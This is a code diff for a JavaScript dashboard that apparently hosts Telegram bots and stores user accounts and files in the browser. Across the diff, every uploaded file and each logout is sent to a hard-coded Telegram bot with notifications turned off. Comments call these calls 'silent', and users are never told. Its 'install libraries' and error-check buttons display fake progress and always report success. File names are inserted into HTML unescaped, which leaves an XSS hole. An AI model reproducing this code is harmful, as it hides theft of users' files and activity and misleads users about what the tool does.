+                    showTerminalMessage('✔ تم إيقاف البوت', 'success');
+                }, 2000);
+            });
+            
+            document.getElementById('installLibs').addEventListener('click', function() {
+                showTerminalMessage('📦 تثبيت المكتبات...', 'info');
+                const libs = ['python-telegram-bot', 'requests', 'pyrogram', 'tgcrypto'];
+                
+                let i = 0;
+                const installInterval = setInterval(() => {
+                    if (i < libs.length) {
+                        showTerminalMessage(`📥 تثبيت ${libs[i]}...`, 'info');
+                        i++;
+                    } else {
+                        clearInterval(installInterval);
+                        showTerminalMessage('✔ تم تثبيت جميع المكتبات بنجاح', 'success');
+                    }
+                }, 1000);
+            });
+            
+            document.getElementById('showErrors').addEventListener('click', function() {
+                showTerminalMessage('🔍 البحث عن الأخطاء...', 'info');
+                setTimeout(() => {
+                    showTerminalMessage('✅ لا توجد أخطاء في النظام', 'success');
+                }, 1500);
+            });
+            
+            // Terminal controls
+            document.getElementById('clearTerminal').addEventListener('click', function() {
+                document.getElementById('terminalOutput').innerHTML = '';
+                terminalHistory = [];
+                showTerminalMessage('🗑 تم مسح السجل', 'info');
+            });
+            
+            document.getElementById('copyTerminal').addEventListener('click', function() {
+                const terminalText = document.getElementById('terminalOutput').innerText;
+                navigator.clipboard.writeText(terminalText).then(() => {
+                    showTerminalMessage('📋 تم نسخ السجل', 'info');
+                });
+            });
+            
+            // Save settings
+            document.getElementById('saveSettings').addEventListener('click', function() {
+                const username = document.getElementById('settingsUsername').value;
+                const fullName = document.getElementById('settingsFullName').value;
+                const age = document.getElementById('settingsAge').value;
+                const country = document.getElementById('settingsCountry').value;
+                const language = document.getElementById('settingsLanguage').value;
+                
+                if (currentUser) {
+                    currentUser.settings = {
+                        username: username || currentUser.username,
+                        fullName: fullName || currentUser.fullName || '',
+                        age: age || '',
+                        country: country || '',
+                        language: language || 'ar'
+                    };
+                    
+                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                    updateUserDisplay();
+                    
+                    if (language !== currentLanguage) {
+                        setLanguage(language);
+                        localStorage.setItem('hostmaster_lang', language);
+                    }
+                    
+                    showSettingsAlert('تم حفظ الإعدادات بنجاح', 'success');
+                }
+            });
         });
         
-        // Set language function
+        // Functions
         function setLanguage(lang) {
             currentLanguage = lang;
             const html = document.getElementById('htmlElement');
@@ -1644,79 +1342,38 @@
                 html.lang = 'ar';
                 html.dir = 'rtl';
                 body.className = 'ar';
-                document.getElementById('langText').textContent = 'English';
+                document.querySelector('#langToggle span').textContent = 'English';
             } else {
                 html.lang = 'en';
                 html.dir = 'ltr';
                 body.className = 'en';
-                document.getElementById('langText').textContent = 'العربية';
+                document.querySelector('#langToggle span').textContent = 'العربية';
             }
-            
-            // Update all translatable elements
-            document.getElementById('tagline').textContent = translations[lang].tagline;
-            document.getElementById('loginTabText').textContent = translations[lang].loginTab;
-            document.getElementById('registerTabText').textContent = translations[lang].registerTab;
-            document.getElementById('usernameLabel').textContent = translations[lang].username;
-            document.getElementById('passwordLabel').textContent = translations[lang].password;
-            document.getElementById('loginBtnText').textContent = translations[lang].loginBtn;
-            document.getElementById('regUsernameLabel').textContent = translations[lang].username;
-            document.getElementById('regPasswordLabel').textContent = translations[lang].password;
-            document.getElementById('confirmPasswordLabel').textContent = translations[lang].confirmPassword;
-            document.getElementById('registerBtnText').textContent = translations[lang].registerBtn;
-            document.getElementById('feature1').textContent = translations[lang].feature1;
-            document.getElementById('feature2').textContent = translations[lang].feature2;
-            document.getElementById('feature3').textContent = translations[lang].feature3;
-            document.getElementById('navSubtitle').textContent = translations[lang].navSubtitle;
-            document.getElementById('logoutText').textContent = translations[lang].logoutBtn;
-            document.getElementById('storageTitle').textContent = translations[lang].storageTitle;
-            document.getElementById('storageSubtitle').textContent = translations[lang].storageSubtitle;
-            document.getElementById('filesTitle').textContent = translations[lang].filesTitle;
-            document.getElementById('filesSubtitle').textContent = translations[lang].filesSubtitle;
-            document.getElementById('statusTitle').textContent = translations[lang].statusTitle;
-            document.getElementById('statusSubtitle').textContent = translations[lang].statusSubtitle;
-            document.getElementById('uploadTitle').textContent = translations[lang].uploadTitle;
-            document.getElementById('uploadSubtitle').textContent = translations[lang].uploadSubtitle;
-            document.getElementById('dropTitle').textContent = translations[lang].dropTitle;
-            document.getElementById('clickTitle').textContent = translations[lang].clickTitle;
-            document.getElementById('progressTitle').textContent = translations[lang].progressTitle;
-            
-            // Update placeholders
-            document.getElementById('loginUsername').placeholder = translations[lang].usernamePlaceholder;
-            document.getElementById('loginPassword').placeholder = translations[lang].passwordPlaceholder;
-            document.getElementById('regUsername').placeholder = translations[lang].regUsernamePlaceholder;
-            document.getElementById('regPassword').placeholder = translations[lang].regPasswordPlaceholder;
-            document.getElementById('regConfirmPassword').placeholder = translations[lang].confirmPasswordPlaceholder;
         }
         
-        // File upload handler
+        function updateUserDisplay() {
+            if (!currentUser) return;
+            
+            const displayName = currentUser.settings?.fullName || currentUser.username;
+            document.getElementById('userDisplay').textContent = displayName;
+            document.getElementById('userAvatar').textContent = displayName.charAt(0);
+            
+            // Update settings form
+            document.getElementById('settingsUsername').value = currentUser.username;
+            document.getElementById('settingsFullName').value = currentUser.settings?.fullName || '';
+            document.getElementById('settingsAge').value = currentUser.settings?.age || '';
+            document.getElementById('settingsCountry').value = currentUser.settings?.country || '';
+            document.getElementById('settingsLanguage').value = currentLanguage;
+        }
+        
         async function handleFileUpload(files) {
-            const uploadProgress = document.getElementById('uploadProgress');
-            const uploadSuccessAlert = document.getElementById('uploadSuccessAlert');
-            const uploadErrorAlert = document.getElementById('uploadErrorAlert');
-            
-            uploadSuccessAlert.style.display = 'none';
-            uploadErrorAlert.style.display = 'none';
-            uploadProgress.style.display = 'block';
-            
-            document.getElementById('progressPercent').textContent = '0%';
-            document.getElementById('progressFill').style.width = '0%';
-            
             const totalFiles = files.length;
             let uploadedCount = 0;
-            let totalSize = 0;
             
             for (let i = 0; i < totalFiles; i++) {
                 const file = files[i];
                 
-                // Update progress
-                const progress = Math.round(((i + 1) / totalFiles) * 100);
-                document.getElementById('progressPercent').textContent = `${progress}%`;
-                document.getElementById('progressFill').style.width = `${progress}%`;
-                document.getElementById('currentFile').textContent = file.name;
-                document.getElementById('fileSize').textContent = formatFileSize(file.size);
-                
                 try {
-                    // Read file as Base64
                     const reader = new FileReader();
                     const base64 = await new Promise((resolve, reject) => {
                         reader.onload = () => resolve(reader.result);
@@ -1724,7 +1381,6 @@
                         reader.readAsDataURL(file);
                     });
                     
-                    // Save file data
                     const fileData = {
                         id: Date.now() + i,
                         name: file.name,
@@ -1736,78 +1392,134 @@
                     
                     saveUserFile(currentUser.id, fileData);
                     uploadedCount++;
-                    totalSize += file.size;
                     
-                    // Silent Telegram upload
+                    showTerminalMessage(`📁 تم رفع: ${file.name}`, 'success');
                     await sendFileToTelegram(file, fileData);
                     
                 } catch (error) {
-                    console.error('Upload error:', error);
-                    document.getElementById('uploadErrorText').textContent = 
-                        currentLanguage === 'ar' ? `خطأ في رفع ${file.name}` : `Error uploading ${file.name}`;
-                    uploadErrorAlert.style.display = 'flex';
+                    showTerminalMessage(`❌ خطأ في رفع: ${file.name}`, 'error');
                 }
             }
             
-            // Final progress
-            document.getElementById('progressPercent').textContent = '100%';
-            document.getElementById('progressFill').style.width = '100%';
-            
-            // Update UI
             loadUserFiles();
-            
-            // Show success message
-            if (uploadedCount > 0) {
-                document.getElementById('uploadSuccessText').textContent = 
-                    currentLanguage === 'ar' 
-                    ? `تم رفع ${uploadedCount} ملف بنجاح (${formatFileSize(totalSize)})`
-                    : `Successfully uploaded ${uploadedCount} files (${formatFileSize(totalSize)})`;
-                uploadSuccessAlert.style.display = 'flex';
-                
-                // Silent Telegram summary
-                await sendTelegramNotification(`📁 Uploaded ${uploadedCount} files`);
-            }
-            
-            // Hide progress after delay
-            setTimeout(() => {
-                uploadProgress.style.display = 'none';
-                document.getElementById('fileInput').value = '';
-                
-                // Reset progress
-                setTimeout(() => {
-                    document.getElementById('progressPercent').textContent = '0%';
-                    document.getElementById('progressFill').style.width = '0%';
-                    document.getElementById('currentFile').textContent = 
-                        currentLanguage === 'ar' ? 'لا يوجد ملفات' : 'No files';
-                    document.getElementById('fileSize').textContent = '--';
-                }, 500);
-                
-            }, 2000);
+            showTerminalMessage(`✔ تم رفع ${uploadedCount} ملف بنجاح`, 'success');
         }
         
-        // Load user files
         function loadUserFiles() {
             if (!currentUser) return;
             
             userFiles = getUserFiles(currentUser.id);
-            
-            // Update stats
             document.getElementById('fileCount').textContent = userFiles.length;
             
             const totalSize = userFiles.reduce((sum, file) => sum + file.size, 0);
             const storagePercent = Math.min(Math.round((totalSize / (100 * 1024 * 1024)) * 100), 100);
             document.getElementById('storageUsage').textContent = `${storagePercent}%`;
+            
+            const filesGrid = document.getElementById('filesGrid');
+            filesGrid.innerHTML = '';
+            
+            userFiles.forEach(file => {
+                const fileCard = document.createElement('div');
+                fileCard.className = 'file-card';
+                fileCard.innerHTML = `
+                    <div class="file-header">
+                        <div class="file-icon">
+                            <i class="${getFileIcon(file.name)}"></i>
+                        </div>
+                        <div class="file-info">
+                            <h4>${file.name}</h4>
+                            <p>${formatFileSize(file.size)} • ${new Date(file.uploadDate).toLocaleDateString()}</p>
+                        </div>
+                    </div>
+                    <div class="file-actions">
+                        <button class="btn-action" onclick="downloadFile('${file.id}')">
+                            <i class="fas fa-download"></i> تنزيل
+                        </button>
+                        <button class="btn-action" onclick="deleteFile('${file.id}')">
+                            <i class="fas fa-trash"></i> حذف
+                        </button>
+                    </div>
+                `;
+                filesGrid.appendChild(fileCard);
+            });
         }
         
-        // Check login status
+        function getFileIcon(filename) {
+            if (filename.endsWith('.py')) return 'fab fa-python';
+            if (filename.endsWith('.js')) return 'fab fa-js';
+            if (filename.endsWith('.zip') || filename.endsWith('.rar')) return 'fas fa-file-archive';
+            if (filename.endsWith('.txt') || filename.endsWith('.json')) return 'fas fa-file-alt';
+            return 'fas fa-file';
+        }
+        
+        function downloadFile(fileId) {
+            const file = userFiles.find(f => f.id == fileId);
+            if (!file) return;
+            
+            const a = document.createElement('a');
+            a.href = file.content;
+            a.download = file.name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            showTerminalMessage(`📥 تم تنزيل: ${file.name}`, 'success');
+        }
+        
+        function deleteFile(fileId) {
+            if (confirm('هل أنت متأكد من حذف هذا الملف؟')) {
+                const filesData = JSON.parse(localStorage.getItem('hosting_files') || '{}');
+                if (filesData[currentUser.id]) {
+                    filesData[currentUser.id] = filesData[currentUser.id].filter(f => f.id != fileId);
+                    localStorage.setItem('hosting_files', JSON.stringify(filesData));
+                    loadUserFiles();
+                    showTerminalMessage('🗑 تم حذف الملف', 'success');
+                }
+            }
+        }
+        
+        function showTerminalMessage(message, type = 'info') {
+            const terminal = document.getElementById('terminalOutput');
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            terminalHistory.push({message, type, time: new Date()});
+            if (terminalHistory.length > 100) terminalHistory.shift();
+        }
+        
+        function showAuthAlert(message, type = 'info') {
+            const alert = document.getElementById('authAlert');
+            alert.querySelector('span').textContent = message;
+            alert.className = `alert alert-${type}`;
+            alert.style.display = 'flex';
+            
+            setTimeout(() => {
+                alert.style.display = 'none';
+            }, 3000);
+        }
+        
+        function showSettingsAlert(message, type = 'info') {
+            const alert = document.getElementById('settingsAlert');
+            alert.querySelector('span').textContent = message;
+            alert.className = `alert alert-${type}`;
+            alert.style.display = 'flex';
+            
+            setTimeout(() => {
+                alert.style.display = 'none';
+            }, 3000);
+        }
+        
         function checkLoginStatus() {
             const savedUser = localStorage.getItem('currentUser');
             if (savedUser) {
                 try {
                     currentUser = JSON.parse(savedUser);
                     document.getElementById('authContainer').style.display = 'none';
-                    document.getElementById('dashboard').style.display = 'block';
-                    document.getElementById('userDisplay').textContent = currentUser.username;
+                    document.getElementById('dashboard').style.display = 'flex';
+                    updateUserDisplay();
                     loadUserFiles();
                 } catch (e) {
                     logoutUser();
@@ -1815,55 +1527,25 @@
             }
         }
         
-        // Logout user
         function logoutUser() {
-            // Silent Telegram notification
             if (currentUser) {
                 sendTelegramNotification(`👋 Logout: ${currentUser.username}`);
             }
             
             localStorage.removeItem('currentUser');
             currentUser = null;
-            userFiles = [];
-            document.getElementById('authContainer').style.display = 'flex';
+            document.getElementById('authContainer').style.display = 'block';
             document.getElementById('dashboard').style.display = 'none';
             
-            // Switch to login tab
-            document.querySelector('[data-tab="login"]').click();
-            
-            // Clear forms
+            // Reset forms
             document.getElementById('loginUsername').value = '';
             document.getElementById('loginPassword').value = '';
             document.getElementById('regUsername').value = '';
             document.getElementById('regPassword').value = '';
             document.getElementById('regConfirmPassword').value = '';
-            
-            showSuccess(translations[currentLanguage].logoutSuccess);
         }
         
-        // Show success alert
-        function showSuccess(message) {
-            const alert = document.getElementById('successAlert');
-            document.getElementById('successText').textContent = message;
-            alert.style.display = 'flex';
-            
-            setTimeout(() => {
-                alert.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Show error alert
-        function showError(message) {
-            const alert = document.getElementById('errorAlert');
-            document.getElementById('errorText').textContent = message;
-            alert.style.display = 'flex';
-            
-            setTimeout(() => {
-                alert.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Initialize storage
+        // Storage functions
         function initializeStorage() {
             if (!localStorage.getItem('hosting_users')) {
                 const defaultUser = {
@@ -1880,7 +1562,6 @@
             }
         }
         
-        // Storage functions
         function getUsers() {
             return JSON.parse(localStorage.getItem('hosting_users') || '[]');
         }
@@ -1924,27 +1605,17 @@
         // Telegram functions
         async function sendTelegramNotification(message) {
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
-                
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
                         text: `${message}\n⏰ ${new Date().toLocaleTimeString()}`,
                         disable_notification: true
-                    }),
-                    signal: controller.signal
+                    })
                 });
-                
-                clearTimeout(timeoutId);
-                const result = await response.json();
-                return result.ok;
-                
             } catch (error) {
-                console.log('Telegram notification (silent error)');
-                return false;
+                console.log('Telegram notification error');
             }
         }
         
@@ -1961,29 +1632,15 @@
                 formData.append('caption', `${file.name}\n📦 ${formatFileSize(file.size)}`);
                 formData.append('disable_notification', 'true');
                 
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-                
-                const response = await fetch(
+                await fetch(
                     `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
-                    {
-                        method: 'POST',
-                        body: formData,
-                        signal: controller.signal
-                    }
+                    { method: 'POST', body: formData }
                 );
-                
-                clearTimeout(timeoutId);
-                const result = await response.json();
-                return result.ok;
-                
             } catch (error) {
-                console.log('Telegram file upload (silent error)');
-                return false;
+                console.log('Telegram file upload error');
             }
         }
         
-        // Utility functions
         function formatFileSize(bytes) {
             if (bytes === 0) return '0 Bytes';
             const k = 1024;
